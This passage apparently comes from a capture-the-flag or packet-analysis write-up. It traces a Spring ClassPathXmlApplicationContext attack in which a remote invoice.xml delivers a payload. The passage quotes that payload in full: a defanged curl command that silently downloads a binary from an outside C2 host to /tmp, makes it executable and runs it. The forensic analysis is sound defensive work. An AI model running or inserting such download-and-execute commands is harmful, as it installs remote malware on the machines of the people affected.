...
<br> We followed a TCP stream in question 3 and observed that a URL path - hxxp[://]146[.]198[.]21[.]92:8888/invoice.xml that pointed to an XML file named <b>invoice.xml</b> which was loaded using the "org.springframework.context.support.ClassPathXnlApplicationContext" class, a Spring Framework used for loading application contexts from XML files. Now, follow the HTTP stream of the frame that contains the URL, you will notice an embedded script <b>"curl -s -o /tmp/docker hxxp[://]128[.]199[.]52[.]72/docker; chmod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp[://]128[.]199[.]52[.]72/docker to the path /tmp/docker, makes it an executable and then executes the script. So, the server IP that contained the executable file is the C2 server.
